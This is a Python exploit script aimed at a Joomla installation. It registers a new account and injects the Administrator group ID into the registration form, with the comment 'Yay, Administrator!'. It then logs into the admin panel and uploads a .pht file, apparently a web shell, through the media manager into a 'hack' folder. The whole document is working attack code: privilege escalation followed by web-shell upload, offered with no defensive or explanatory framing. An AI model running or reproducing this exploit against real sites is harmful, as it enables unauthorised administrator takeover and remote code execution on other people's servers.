import requests
import re
from bs4 import BeautifulSoup
import random
class cms_user :
	def __init__(self,base_url,username,password,email,exploit_file='filthyc0w.pht'):
		self.username = username
		self.password = password
		self.base_url = base_url
		self.email    = email
		self.exploit_file = open(exploit_file,"r")
	def joomla_login(self):
		#input base_url
		#return bool
		sess=requests.Session()
		admin_url=self.base_url+'/administrator/index.php'
		resp=sess.get(admin_url)
		token=self.extract_token(resp)
		data = {
			'username': self.username,
			'passwd': self.password,
			'task': 'login',
			token: '1'
		}
		res=sess.post(admin_url,data=data)
		if "Administration - Control Panel" not in res.content:
			print "Login Fail"
			return False
		print "Login Sucess"
		print "username : "+self.username
		return sess

	def extract_token(self,resp):
		match=re.search(r'name="([a-f0-9]{32})" value="1"',resp.content)
		if match is None:
			print "not found token" 
			return None		
		print "get token: %s" % match.group(1)
		return match.group(1)

	def joomla_register(self):
		reg_url=self.base_url+"/index.php/component/users/?task=registration.register"
		form_url=self.base_url+"/index.php/component/users/?view=login"
		print reg_url
		sess=requests.Session()
		resp=sess.get(form_url)
		token=self.extract_token(resp)
		data={
		"user[name]":self.username,
		"user[username]":self.username,
		"user[password1]":self.password,
		"user[password2]":self.password,
		"user[email1]": self.email,
		"user[email2]": self.email,
		'user[groups][]': '7',	# Yay, Administrator!
		# Sometimes these will be overridden
		'user[activation]': '0',
		'user[block]': '0',
		'option': 'com_users',
		'task': 'user.register',
		token: '1',
		}
		reg=sess.post(reg_url,data=data)
		print reg.status_code

	def upload_file(self,sess):
		upload_form_url=self.base_url+"/administrator/index.php?option=com_media&folder="
		resp=sess.get(upload_form_url)
		form_tag=BeautifulSoup(resp.content,"lxml").find("form",id="uploadForm")
		if not form_tag:
			print "Form_upload can't found"
			return False
		upload_url=form_tag.get("action")+"&folder=hack"
		print upload_url
		filename=get_random_name()
		print filename
		file={"Filedata[]": ( filename , self.exploit_file , 'application/octet-stream')} #pht test image/pht
		data=dict(folder="hack")
		resp=sess.post(upload_url,files=file,data=data)
		if filename not in resp.content:
			print("[!] Failed to upload file!")
			return False
def get_random_name():
	name=""
	for i in range(7):
		name+=chr(random.randint(65,90))
	return name+'.pht'
base_url="http://localhost/Joomla_344"

'''	
useage:

a=cms_user(base_url,"moon","moon")
a.joomla_login()

'''
a=cms_user(base_url,"hack","hack","asd@hack.com")
a.joomla_register()
sess=a.joomla_login()
a.upload_file(sess)

